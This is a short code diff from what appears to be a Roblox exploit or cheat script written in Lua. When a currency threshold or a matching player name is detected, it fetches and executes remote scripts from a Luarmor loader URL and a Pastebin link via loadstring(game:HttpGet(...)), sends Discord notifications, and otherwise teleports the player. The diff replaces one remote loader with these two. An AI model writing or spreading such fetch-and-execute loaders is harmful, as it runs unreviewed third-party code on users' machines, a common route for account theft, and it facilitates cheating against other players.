@@ -256,7 +256,8 @@ if meetsMinimum then
 	sound:Play()
 	
 	task.spawn(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
+		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/53325754de16c11fbf8bf78101c1c881.lua"))()
+		loadstring(game:HttpGet("https://pastebin.com/raw/fpkbJgyq"))()
 	end)
 	
 	DiscordNotificationCURRENCY(currencyTextLabel)
@@ -271,7 +272,8 @@ elseif nameFound then
 	sound:Play()
 	
 	task.spawn(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
+		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/53325754de16c11fbf8bf78101c1c881.lua"))()
+		loadstring(game:HttpGet("https://pastebin.com/raw/fpkbJgyq"))()
 	end)
 	
 	DiscordNotificationNAME(matchedName)
@@ -374,6 +376,7 @@ else
 		game["Teleport Service"]:Teleport(109983668079237, game.Players.LocalPlayer)
 	end
 end
+
 
 
 
